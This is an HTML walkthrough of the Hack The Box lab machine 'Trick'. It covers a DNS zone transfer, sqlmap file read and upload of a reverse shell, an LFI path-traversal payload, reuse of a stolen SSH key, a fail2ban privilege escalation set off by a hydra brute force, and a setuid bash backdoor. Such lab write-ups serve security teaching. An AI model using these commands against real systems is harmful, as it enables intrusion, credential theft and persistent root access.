        <h3>DNS: Port 53</h3>
        <p>
            Since we know that DNS port 53 is open, I tried to do I zone transfer, and here is what I got.<br>
            <code>dig axfr @10.129.227.180 trick.htb</code><br>
            <img src="./imgs/zonetransfer.png" alt="zone transfer"><br>
            New subdomain was found.<br>
            <code>preprod-payroll.trick.htb</code><br>
            <code>root.trick.htb</code><br>
            I am adding these to my <code>/etc/hosts</code>
        </p>

        <h3>Payroll Management System</h3>
        <p>
            I went to <a href="http://preprod-payroll.trick.htb">preprod-payroll</a><br>
            <img src="./imgs/preprod-payroll.png" alt="preprod-payroll"><br>
        </p>
        <h4>Researching...</h4>
        <p>
            Something interesting that I found was:<br>
            <img src="./imgs/payroll-items.png" alt="payroll-items.png"><br>
            However, it did not give me much information about the SQL Injection.
        </p>
        <p>
            <img src="./imgs/id=1.png" alt="id=1">
        </p>

        <h3>SQL Injection</h3>
        <p>
            After researching for a little bit I found a cool tool called <code>sqlmap</code>. Basically it designed to look for sql injections. First I just ran it to see if the webpage was vulnerable to SQL Injections.<br>
            <code>sqlmap -u http://preprod-payroll.trick.htb/payroll_items.php?id=1</code><br>
            <img src="./imgs/vulnerable.png" alt="vulnerable">
        </p>
        
        <h4>Some cool features that I found, that may help us in the future.</h4>
        <p>
            File read:<br>
            <code>sqlmap -u http://preprod-payroll.trick.htb/payroll_items.php?id=1 --file-read="/etc/passwd"</code>
        </p>
        <p>
            File upload:<br>
            <code>sqlmap -u http://preprod-payroll.trick.htb/payroll_items.php?id=1 --file-write="(local-file)" --file-dest="(destination-filepath)"</code>
        </p>
        <p>
            I went ahead and thought that would be good to put a reverse shell on the system in case we need it. I got the <i>PentestMonkey</i> one from 
            <a href="https://revshells.com">revshells</a> and put it on the system<br>
            <code>sqlmap -u http://preprod-payroll.trick.htb/payroll_items.php?id=1 --file-write="shell.php" --file-dest="/tmp/shell.php"</code>
        </p>

        <h3>Discovery</h3>
        <p>Since I knew the webserver was running <code>nginx</code> I decided to check if it had any other subdomains that I did not know of.</p>
        <p>
            I used my file reading ability and read <code>/etc/nginx/sites-available/default</code><br>
            <img src="./imgs/preprod-marketing.png" alt="preprod marketing">

            <img src="./imgs/preprod-marketing.trick.htb.png" alt="preprod-marketing.trick.htb">
        </p>
        <p>
            Here is what I noticed when I clicked on Services:<br>
            <img src="./imgs/services.html.png" alt="services.html">
        </p>

        <h3>LFI (Local File Inclusion)</h3>
        <p>
            I started messing around trying to find LFI.<br>
            <img src="./imgs/nw1.png" alt="not working 1"><br>
            However, after a little bit more of trying I found this:<br>
            <img src="./imgs/lfi.png" alt="local file inclusion">
        </p>

        <h3>Reverse Shell</h3>
        <p>
            Remember the php reverse shell that we got onto the system earlier? Now, I start a <code>nc</code> listener wait for magic.<br>
            <code>nc -lvnp 4444</code><br>
            <code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//tmp/shell.php</code>
            <img src="./imgs/reverse-shell.png" alt="reverse-shell">
        </p>

        <hr>

        <h3>Research</h3>
        <p>
            I moved around the system and found <code>id_rsa</code> for <code>michael</code> in <code>/home/michael/.ssh/id_rsa</code><br>
            <img src="./imgs/id_rsa.png" alt="id_rsa"><br>
            I used it and was able to <code>ssh</code> as michael.
        </p>
        
        <h3>Privilege Escalation</h3>
        <p>
            I ran <code>sudo -l</code> to see if I was able to run anything as root.<br>
            <img src="./imgs/sudo.png" alt="sudo"><br>
            Looks like I can run <code>fail2ban restart</code> as root.
        </p>
        <p>
            I did some more research on <code>fail2ban</code> on the system.<br>
            <img src="./imgs/fail2ban-group.png" alt="fail2ban-group">
            This is something interesting and useful that I found.<br>
            The directory <code>action.d</code> was owned by the <code>security</code> group and <code>michael</code> was part of the group.
        </p>
        <p>
            I looked around a little more to find what I could do with that.<br>
            <img src="./imgs/jail.conf.png" alt="jail.conf"><br>
            I read the <code>/etc/fail2ban/jail.conf</code> I found this configuration for <code>ssh</code>.
            It means if there are more than 5 failed attempts of ssh login, it will ban it.
        </p>
        <p>
            After a little bit of research I found that the <code>action.d</code> directory is reponsible for all the actions including banning.
            There are many config files, but since there is no any special for ssh, we can assume that one of the iptables should work.<br>
            <img src="./imgs/iptables.png" alt="iptables">
        </p>
        <p>
            I created a <code>/tmp/shell.sh</code> for my root reverse shell.<br>
            <img src="./imgs/shell.sh.png" alt="shell.sh"><br>
            Don't forget <code>chmod +x /tmp/shell.sh</code> so it can be run.
        </p>

        <p>
            Even though michael was part of the security group I was not able to modify the contents of the config files<br>
            <img src="./imgs/notwrittable.png" alt="notwrittable">
        </p>
        <p>
            Here is a little trick:<br>
            <img src="./imgs/michaelowner.png" alt="michael owner"><br>
            <code>mv action.d/iptables-multiport.conf action.d/iptables-multiport.conf.bak</code><br>
            <code>cp action.d/iptables-multiport.conf.bak action.d/iptables-multiport.conf</code>
        </p>

        <p>
            Then, I changed these lines in <code>iptables-multiport.conf</code><br>
            <img src="./imgs/iptableschaned.png" alt="iptables changed">
        </p>
        <p>
            Restarted <code>fail2ban</code><br>
            <code>sudo /etc/init.d/fail2ban restart</code>
        </p>
        <p>
            Started <code>hydra</code> ssh brute forcing so it gets enough failed login attempts.<br>
            <code>hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://trick.htb</code>
        </p>
        <p>
            Now I just had to wait for magic. After a few seconds my root shell appeared.
        </p>
        <p>
            <img src="./imgs/root.png" alt="root">
        </p>
        <p>
            For persistence I immediately typed <code>chmod +s /bin/bash</code> from my root reverse shell. 
            And then in michael's ssh I typed <code>/bin/bash -p</code> to get my <b>root</b> shell in the ssh.
        </p>
        <p>
